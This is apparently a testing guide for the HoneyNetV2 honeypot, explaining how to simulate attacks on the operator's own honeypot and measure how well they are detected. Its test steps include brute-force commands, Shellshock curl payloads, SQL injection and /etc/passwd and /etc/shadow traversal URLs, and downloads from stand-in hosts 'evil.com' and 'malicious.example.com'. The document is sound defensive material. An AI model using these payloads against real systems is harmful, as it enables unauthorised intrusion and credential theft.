# HoneyNetV2 Testing and Validation Guide

## Overview

This guide provides comprehensive testing procedures for HoneyNetV2, including end-to-end attack scenario testing, detection effectiveness verification, and validation methodologies.

**Target Audience**: Security researchers, system administrators, QA engineers
**Last Updated**: 2025-10-24

---

## Table of Contents

1. [Testing Environment Setup](#testing-environment-setup)
2. [Attack Scenario Testing](#attack-scenario-testing)
3. [Detection Effectiveness Verification](#detection-effectiveness-verification)
4. [Offline Testing with PCAPs](#offline-testing-with-pcaps)
5. [Performance Testing](#performance-testing)
6. [Troubleshooting](#troubleshooting)

---

## Testing Environment Setup

### Prerequisites

To perform comprehensive testing, you'll need an **attacker machine** separate from the honeypot infrastructure:

#### Recommended: Kali Linux VM

```bash
# Download Kali Linux
# https://www.kali.org/get-kali/#kali-virtual-machines

# Or use Docker
docker run -it --rm --network host kalilinux/kali-rolling bash

# Install required tools
apt update
apt install -y hydra medusa nmap curl wget sshpass telnet \
    netcat-traditional snmp python3-scapy
```

#### Network Configuration

- **Attacker Machine**: Must have network access to honeypot host
- **Honeypot Host**: Publicly accessible IP or accessible via LAN
- **Test Timing**: Coordinate with team to avoid interference with production data collection

### Environment Variables

Configure test environment in `.env` or export:

```bash
export HONEYPOT_HOST="192.168.1.100"  # Your honeypot IP
export CLICKHOUSE_HOST="localhost"
export CLICKHOUSE_USER="honeynet"
export CLICKHOUSE_PASSWORD="your_password"
```

---

## Attack Scenario Testing

### Automated Testing Suite

The `tests/test_scenarios.py` script provides automated testing for all major attack vectors.

#### Usage

```bash
# List all available scenarios
python3 tests/test_scenarios.py --list

# Run all scenarios
python3 tests/test_scenarios.py --scenario all

# Run specific scenario
python3 tests/test_scenarios.py --scenario ssh-bruteforce

# Dry run (show what would be tested)
python3 tests/test_scenarios.py --dry-run

# Execute without verification (manual verification later)
python3 tests/test_scenarios.py --scenario all --no-verify
```

#### Test Output

```
================================================================================
ATTACK SCENARIO TEST REPORT
================================================================================
Timestamp: 2025-10-24T14:30:00.000Z
Target: 192.168.1.100

Total Scenarios: 9
Executed: 9
Honeypot Detected: 8 (88.9%)
IDS Detected: 9 (100.0%)
Both Detected: 8 (88.9%)
MITRE Mapped: 7 (77.8%)

True Positive Rate (TPR): 100.0%
Required TPR: 80.0%
✓ TPR THRESHOLD MET

Detailed Results:
--------------------------------------------------------------------------------
✓ ssh-bruteforce:
    Events: 5, Alerts: 1
✓ telnet-bruteforce:
    Events: 3, Alerts: 1
...
```

---

## Manual Attack Scenarios

### 1. SSH Brute-Force Attack

**Objective**: Verify Cowrie logs authentication attempts and Suricata detects brute-force patterns.

**Expected Detections**:
- Cowrie: Logs to `credentials` table
- Suricata: Alert SID `2000005` (SSH brute-force)
- MITRE: `T1110.001` (Password Guessing)

#### Using Hydra

```bash
# Create password list
cat > passwords.txt <<EOF
root
admin
password
123456
qwerty
EOF

# Run brute-force
hydra -l root -P passwords.txt ssh://$HONEYPOT_HOST -t 4 -f

# Expected: 5 login attempts
```

#### Using Medusa

```bash
medusa -h $HONEYPOT_HOST -u admin -P passwords.txt -M ssh -t 4
```

#### Verification Queries

```sql
-- Check Cowrie captured credentials
SELECT timestamp, username, password, success
FROM honeynet.credentials
WHERE timestamp >= now() - INTERVAL 5 MINUTE
ORDER BY timestamp DESC
LIMIT 10;

-- Check Suricata alerts
SELECT timestamp, signature, signature_id, source_ip_hash
FROM honeynet.ids_alerts
WHERE signature_id IN (2000005, 1000001)  -- SSH brute-force SIDs
  AND timestamp >= now() - INTERVAL 5 MINUTE;

-- Check MITRE mapping
SELECT mitre_technique_id, mitre_tactic, count() as cnt
FROM honeynet.ids_alerts
WHERE timestamp >= now() - INTERVAL 5 MINUTE
  AND mitre_technique_id = 'T1110.001'
GROUP BY mitre_technique_id, mitre_tactic;
```

---

### 2. Telnet Brute-Force Attack

**Objective**: Test Telnet honeypot and brute-force detection.

**Expected Detections**:
- Cowrie: Telnet authentication logs
- Suricata: Alert SID `2000002` (Telnet brute-force)

#### Manual Test

```bash
# Using expect script
cat > telnet_test.exp <<'EOF'
#!/usr/bin/expect -f
set timeout 5
spawn telnet $env(HONEYPOT_HOST) 23
expect "login:"
send "admin\r"
expect "Password:"
send "admin\r"
expect eof
EOF

chmod +x telnet_test.exp
./telnet_test.exp
```

#### Using ncrack

```bash
ncrack -U usernames.txt -P passwords.txt telnet://$HONEYPOT_HOST:23
```

---

### 3. Shellshock (CVE-2014-6271) Exploit

**Objective**: Test HTTP exploit detection and Dionaea response.

**Expected Detections**:
- Dionaea: HTTP request with exploit pattern
- Suricata: Alert SID `2000008`, `2000009` (Shellshock)
- Logstash: Sets `is_exploit: "1"`, `exploit_type: "shellshock"`
- MITRE: `T1190` (Exploit Public-Facing Application)

#### Test Payloads

```bash
# Payload 1: User-Agent header
curl -H "User-Agent: () { :; }; echo vulnerable" http://$HONEYPOT_HOST:80/

# Payload 2: Referer header
curl -H "Referer: () { :; }; /bin/bash -c 'whoami'" http://$HONEYPOT_HOST:80/

# Payload 3: Cookie
curl -H "Cookie: () { :; }; /usr/bin/id" http://$HONEYPOT_HOST:80/cgi-bin/test.sh

# Payload 4: Custom header
curl -H "X-Forwarded-For: () { :; }; echo pwned" http://$HONEYPOT_HOST:80/
```

#### Verification

```sql
-- Check Dionaea HTTP events with exploit flag
SELECT timestamp, src_ip, method, url, user_agent, is_exploit, exploit_type
FROM honeynet.honeypot_events
WHERE protocol = 'http'
  AND timestamp >= now() - INTERVAL 5 MINUTE
  AND (is_exploit = '1' OR exploit_type != '')
ORDER BY timestamp DESC;

-- Check Suricata Shellshock alerts
SELECT timestamp, signature, alert_metadata
FROM honeynet.ids_alerts
WHERE signature_id IN (2000008, 2000009, 1000021)
  AND timestamp >= now() - INTERVAL 5 MINUTE;
```

---

### 4. Malware Download Simulation

**Objective**: Test malware download detection and file capture.

**Expected Detections**:
- Dionaea: File download logged in `downloaded_files`
- Suricata: Alert SID `2000027` (Suspicious binary download)
- File hash captured for analysis

#### Simulate wget Download

```bash
# First, establish SSH session to Cowrie
sshpass -p 'password' ssh root@$HONEYPOT_HOST

# In Cowrie shell, execute
wget http://malicious.example.com/malware.bin
curl -O http://evil.com/backdoor.sh
exit
```

#### Direct HTTP Download to Dionaea

```bash
# Upload binary to trigger detection
curl -X POST -F "file=@/bin/ls" http://$HONEYPOT_HOST:80/upload

# Or simulate malware GET request
curl http://$HONEYPOT_HOST:80/malware.exe -o /dev/null
```

#### Verification

```sql
-- Check downloaded files
SELECT timestamp, filename, file_hash, file_size, source_ip_hash
FROM honeynet.downloaded_files
WHERE timestamp >= now() - INTERVAL 10 MINUTE
ORDER BY timestamp DESC;

-- Check file stored on disk
-- Files saved to: data/dionaea/binaries/<sha256>
```

---

### 5. ICS/SCADA Protocol Attacks

#### 5.1 Modbus Testing

**Objective**: Test Conpot Modbus honeypot and ICS-specific IDS rules.

**Expected Detections**:
- Conpot: Modbus interaction logged
- Suricata: Alert SID `2000019` (Modbus read), `2000020` (Modbus write)
- MITRE: `T0840` (ICS Network Connection Enumeration)

**Test with Python Scapy**:

```python
#!/usr/bin/env python3
from scapy.all import *
import sys

target = sys.argv[1] if len(sys.argv) > 1 else "localhost"

# Modbus Read Holding Registers (Function Code 03)
modbus_read = (
    b'\x00\x01'  # Transaction ID
    b'\x00\x00'  # Protocol ID
    b'\x00\x06'  # Length
    b'\x01'      # Unit ID
    b'\x03'      # Function Code: Read Holding Registers
    b'\x00\x00'  # Starting Address
    b'\x00\x0A'  # Quantity of Registers
)

# Send packet
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((target, 502))
sock.send(modbus_read)
response = sock.recv(1024)
sock.close()

print(f"Sent Modbus read request, got {len(response)} bytes")
```

**Test with modbus-cli**:

```bash
# Install modbus-cli
pip3 install modbus-cli

# Read registers
modbus $HONEYPOT_HOST read 0 10

# Write register (triggers different alert)
modbus $HONEYPOT_HOST write 100 42
```

#### 5.2 SNMP Testing

**Objective**: Test SNMP honeypot and community string brute-force detection.

**Expected Detections**:
- Conpot: SNMP requests logged
- Suricata: Alert SID `1000013` (SNMP brute-force)

```bash
# Test common community strings
for community in public private admin community; do
    echo "Trying: $community"
    snmpwalk -v 2c -c $community $HONEYPOT_HOST system
    sleep 1
done

# Bulk OID enumeration
snmpwalk -v 2c -c public $HONEYPOT_HOST .1.3.6.1.2.1
```

#### Verification

```sql
-- Check Conpot events
SELECT timestamp, protocol, event_type, details
FROM honeynet.honeypot_events
WHERE honeypot_name = 'conpot'
  AND timestamp >= now() - INTERVAL 10 MINUTE
ORDER BY timestamp DESC;

-- Check ICS-specific alerts
SELECT timestamp, signature, signature_id, mitre_technique_id
FROM honeynet.ids_alerts
WHERE signature_id BETWEEN 2000015 AND 2000025  -- ICS rule range
  AND timestamp >= now() - INTERVAL 10 MINUTE;
```

---

### 6. Lateral Movement Detection

**Objective**: Verify detection of internal DMZ traffic (post-compromise activity).

**Expected Detections**:
- Suricata: Alert SID `2000035` (SSH tunneling / lateral movement)
- Zeek: Logs internal connections in `network_connections`
- Honeypot events with `dest_ip` in DMZ range (`172.20.0.0/24`)

#### Simulate Internal SSH

```bash
# From Cowrie to Dionaea
docker exec honeynet-cowrie ssh -o StrictHostKeyChecking=no root@172.20.0.11

# From Cowrie to Conpot
docker exec honeynet-cowrie nc -zv 172.20.0.12 502
```

#### Simulate Port Scan Between Honeypots

```bash
# Scan all ports on Dionaea from Cowrie
docker exec honeynet-cowrie nmap -p- 172.20.0.11
```

#### Verification

```sql
-- Check for internal traffic
SELECT timestamp, source_ip_hash, dest_ip, dest_port, protocol
FROM honeynet.honeypot_events
WHERE dest_ip LIKE '172.20.0.%'  -- Internal DMZ
  AND timestamp >= now() - INTERVAL 10 MINUTE
ORDER BY timestamp DESC;

-- Check lateral movement alerts
SELECT timestamp, signature, src_ip, dest_ip, dest_port
FROM honeynet.ids_alerts
WHERE signature_id = 2000035  -- Lateral movement rule
  AND timestamp >= now() - INTERVAL 10 MINUTE;

-- Check network connections (Zeek)
SELECT timestamp, orig_h, resp_h, resp_p, conn_state
FROM honeynet.network_connections
WHERE resp_h LIKE '172.20.0.%'
  AND timestamp >= now() - INTERVAL 10 MINUTE
ORDER BY timestamp DESC;
```

---

### 7. Port Scanning Detection

**Objective**: Test IDS detection of reconnaissance activities.

**Expected Detections**:
- Suricata: Alert SID `1000025` (SYN scan), `1000026` (NULL scan)
- MITRE: `T1046` (Network Service Scanning)

#### nmap Scans

```bash
# SYN scan (stealth)
nmap -sS $HONEYPOT_HOST

# Full TCP connect scan
nmap -sT $HONEYPOT_HOST

# NULL scan
nmap -sN $HONEYPOT_HOST

# Aggressive scan with service detection
nmap -A -p- $HONEYPOT_HOST
```

---

### 8. Web Application Attacks

#### SQL Injection

```bash
# Test SQL injection patterns
curl "http://$HONEYPOT_HOST/login.php?user=admin'+OR+'1'='1"
curl "http://$HONEYPOT_HOST/search?q=test';DROP+TABLE+users--"
```

#### Directory Traversal

```bash
curl "http://$HONEYPOT_HOST/../../../etc/passwd"
curl "http://$HONEYPOT_HOST/download?file=....//....//....//etc/shadow"
```

#### Verification

```sql
-- Check web attack detections
SELECT timestamp, signature, http_url, http_method
FROM honeynet.ids_alerts
WHERE signature_id IN (1000028, 1000029)  -- Traversal, SQLi
  AND timestamp >= now() - INTERVAL 5 MINUTE;

-- Check HTTP requests (Zeek)
SELECT timestamp, method, host, uri, user_agent
FROM honeynet.http_requests
WHERE timestamp >= now() - INTERVAL 5 MINUTE
  AND (uri LIKE '%../%' OR uri LIKE '%union%' OR uri LIKE '%select%')
ORDER BY timestamp DESC;
```

---

## Detection Effectiveness Verification

### True Positive Rate (TPR)

**Goal**: Achieve **≥80% TPR** for known attack vectors.

#### Calculation

```
TPR = (Detected Attacks) / (Total Simulated Attacks)
```

#### Measurement Process

1. **Run all test scenarios** with known attack signatures
2. **Wait 60 seconds** for log processing
3. **Query databases** to verify detection
4. **Calculate TPR** from results

```bash
# Automated TPR calculation
python3 tests/test_scenarios.py --scenario all

# Manual TPR check
# 1. Count test attacks: 9 scenarios
# 2. Query detections:
docker exec honeynet-clickhouse clickhouse-client --query="
SELECT
    COUNT(DISTINCT signature_id) as unique_alerts,
    COUNT(*) as total_alerts
FROM honeynet.ids_alerts
WHERE timestamp >= now() - INTERVAL 1 HOUR
"
```

#### TPR Thresholds

| TPR | Status | Action Required |
|-----|--------|-----------------|
| ≥90% | Excellent | Continue monitoring |
| 80-89% | Good | Minor tuning recommended |
| 70-79% | Acceptable | Review missed attacks |
| <70% | **Failing** | **Immediate investigation required** |

---

### False Positive Rate (FPR)

**Goal**: Maintain **≤5% FPR** to avoid alert fatigue.

#### Measurement

```
FPR = (False Positive Alerts) / (Total Alerts)
```

#### Procedure

1. **Baseline Period**: Run system with NO attacks for 24 hours
2. **Identify Benign Traffic**: Log all legitimate operations (backups, monitoring, etc.)
3. **Count Unexpected Alerts**: Alerts triggered by non-attack traffic
4. **Calculate FPR**

```sql
-- Identify potential false positives
-- (alerts during known non-attack periods)
SELECT
    signature_id,
    signature,
    COUNT(*) as alert_count,
    uniq(source_ip_hash) as unique_sources
FROM honeynet.ids_alerts
WHERE timestamp BETWEEN '2025-10-24 00:00:00' AND '2025-10-24 23:59:59'
  -- Exclude known test IPs
  AND source_ip_hash NOT IN (SELECT ip_hash FROM test_sources)
GROUP BY signature_id, signature
HAVING alert_count > 100  -- High frequency = possible FP
ORDER BY alert_count DESC;
```

#### FP Mitigation

**If FPR > 5%**:

1. **Identify noisy rules**:
   ```sql
   SELECT signature_id, COUNT(*) as cnt
   FROM ids_alerts
   WHERE timestamp >= now() - INTERVAL 7 DAY
   GROUP BY signature_id
   ORDER BY cnt DESC
   LIMIT 10;
   ```

2. **Review rule thresholds** in `configs/suricata/rules/*.rules`
3. **Add suppressions** if legitimate traffic triggers alerts:
   ```
   # configs/suricata/suppress.conf
   suppress gen_id 1, sig_id 2000005, track by_src, ip 192.168.1.50
   ```

4. **Adjust threshold**:
   ```
   # From:
   threshold: type threshold, track by_src, count 5, seconds 60
   # To:
   threshold: type threshold, track by_src, count 10, seconds 60
   ```

---

## Offline Testing with PCAPs

### Why Offline Testing?

- **Reproducible**: Same traffic every time
- **Safe**: No live attacks needed
- **Fast**: Test rule changes instantly
- **Comprehensive**: Use known attack datasets

### PCAP Resources

```bash
# Create pcap directory
mkdir -p tests/pcaps

# Download sample attack PCAPs
cd tests/pcaps

# Mirai botnet traffic
wget https://www.malware-traffic-analysis.net/2016/10/21/2016-10-21-Mirai-DDoS-traffic.pcap.zip
unzip 2016-10-21-Mirai-DDoS-traffic.pcap.zip

# Shellshock exploit
wget https://github.com/MITRECND/malchive/raw/master/attack_pcaps/shellshock.pcap

# SQL injection
wget https://www.netresec.com/?download=pcap-files/sqlinjection.pcap
```

### Running Suricata in Offline Mode

```bash
# Test single PCAP
docker exec honeynet-suricata suricata \
    -r /var/log/suricata/test.pcap \
    -c /etc/suricata/suricata.yaml \
    -l /var/log/suricata/pcap_test/

# View results
docker exec honeynet-suricata cat /var/log/suricata/pcap_test/fast.log

# Check specific rule triggered
docker exec honeynet-suricata grep "SID:2000008" /var/log/suricata/pcap_test/fast.log
```

### Automated PCAP Testing Script

```bash
#!/bin/bash
# tests/run_pcap_tests.sh

PCAP_DIR="tests/pcaps"
RESULTS_DIR="tests/pcap_results"

mkdir -p $RESULTS_DIR

for pcap in $PCAP_DIR/*.pcap; do
    name=$(basename $pcap .pcap)
    echo "Testing: $name"

    docker exec honeynet-suricata suricata \
        -r /data/pcaps/$name.pcap \
        -c /etc/suricata/suricata.yaml \
        -l /data/results/$name/

    # Count alerts
    alerts=$(docker exec honeynet-suricata wc -l < /data/results/$name/fast.log)
    echo "  Alerts generated: $alerts"

    # Extract unique SIDs
    docker exec honeynet-suricata \
        grep -oP 'SID:\d+' /data/results/$name/fast.log | sort -u \
        > $RESULTS_DIR/${name}_sids.txt
done

echo "PCAP testing complete. Results in $RESULTS_DIR/"
```

---

## Performance Testing

### Load Testing

Simulate high attack volume to verify system stability.

```bash
# Concurrent SSH brute-force attacks
for i in {1..10}; do
    (hydra -l root -P passwords.txt ssh://$HONEYPOT_HOST &)
done

# Monitor resource usage
docker stats honeynet-suricata honeynet-zeek honeynet-clickhouse
```

### Metrics to Monitor

```sql
-- Event ingestion rate
SELECT
    toStartOfHour(timestamp) as hour,
    count() as events_per_hour
FROM honeynet.honeypot_events
WHERE timestamp >= now() - INTERVAL 24 HOUR
GROUP BY hour
ORDER BY hour;

-- Logstash processing lag
-- Check sincedb positions vs actual file sizes
docker exec honeynet-logstash cat /usr/share/logstash/data/plugins/inputs/file/.sincedb*
```

### Stress Test Scenarios

1. **High Connection Rate**: 1000 connections/minute
2. **Large File Downloads**: Upload 100MB binaries
3. **Sustained Scanning**: nmap scan for 1 hour
4. **Multi-Protocol Attack**: All services simultaneously

---

## Troubleshooting

### No Detections Appearing

**Symptom**: Attack executed but no entries in database

**Checks**:

1. **Verify services running**:
   ```bash
   docker-compose ps
   python3 tests/test_e2e.py
   ```

2. **Check Logstash is reading logs**:
   ```bash
   docker logs honeynet-logstash | grep "Completed"
   docker logs honeynet-logstash | grep ERROR
   ```

3. **Verify ClickHouse connectivity**:
   ```bash
   curl http://localhost:8123/ping
   docker exec honeynet-clickhouse clickhouse-client --query "SELECT 1"
   ```

4. **Check honeypot logs exist**:
   ```bash
   ls -lh data/cowrie/cowrie.json*
   ls -lh data/dionaea/dionaea.json
   tail -f data/suricata/eve.json
   ```

5. **Verify Suricata rules loaded**:
   ```bash
   docker logs honeynet-suricata | grep "rule(s) loaded"
   # Should show: "38 rule(s) loaded" or similar
   ```

---

### Detections Missing MITRE Fields

**Symptom**: `mitre_technique_id` is empty

**Solution**:

1. Check Suricata rules have metadata:
   ```bash
   grep "metadata.*mitre" configs/suricata/rules/*.rules
   ```

2. Verify Logstash parses metadata:
   ```bash
   docker logs honeynet-logstash | grep mitre
   ```

3. Check alert format:
   ```bash
   docker exec honeynet-suricata tail -n 1 /var/log/suricata/eve.json | jq .alert.metadata
   ```

---

### GeoIP Not Populated

**Symptom**: `source_ip_country` is always empty

**Solution**:

1. Verify GeoIP database installed:
   ```bash
   docker exec honeynet-logstash ls -lh /usr/share/logstash/vendor/geoip/
   ```

2. Check Logstash GeoIP filter:
   ```bash
   docker exec honeynet-logstash cat /usr/share/logstash/pipeline/cowrie.conf | grep geoip
   ```

3. Test manually:
   ```bash
   docker exec honeynet-logstash logstash -e '
   input { generator { count => 1 message => "test" } }
   filter {
     mutate { add_field => { "src_ip" => "8.8.8.8" } }
     geoip { source => "src_ip" target => "geoip" }
   }
   output { stdout { codec => rubydebug } }
   '
   ```

---

## Test Automation

### Continuous Testing with Cron

```bash
# Add to crontab
crontab -e

# Run daily attack scenarios (off-peak hours)
0 3 * * * cd /opt/HoneyNetV2 && python3 tests/test_scenarios.py --scenario all > /var/log/honeynet_tests.log 2>&1

# Weekly PCAP regression tests
0 4 * * 0 /opt/HoneyNetV2/tests/run_pcap_tests.sh
```

### CI/CD Integration

```yaml
# .github/workflows/test.yml
name: HoneyNet Testing

on:
  push:
    branches: [main, develop]
  schedule:
    - cron: '0 2 * * *'  # Daily at 2 AM

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2

      - name: Start HoneyNet
        run: docker-compose up -d

      - name: Wait for services
        run: sleep 60

      - name: Run tests
        run: python3 tests/test_scenarios.py --scenario all

      - name: Upload test report
        uses: actions/upload-artifact@v2
        with:
          name: test-report
          path: test_report_*.json
```

---

## Best Practices

1. **Document Baselines**: Record normal TPR/FPR before changes
2. **Test Before Deploy**: Run scenarios after config changes
3. **Isolate Tests**: Use separate test environment when possible
4. **Version Control**: Track rule changes with git
5. **Regular Audits**: Review detection effectiveness monthly
6. **Update Threat Intel**: Refresh test scenarios with new TTPs

---

## References

- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [Suricata User Guide](https://suricata.readthedocs.io/)
- [PCAP Repository](https://www.malware-traffic-analysis.net/)
- [Cowrie Documentation](https://cowrie.readthedocs.io/)

---

**Document Version**: 1.0
**Author**: Agent #6b - Testing & Documentation
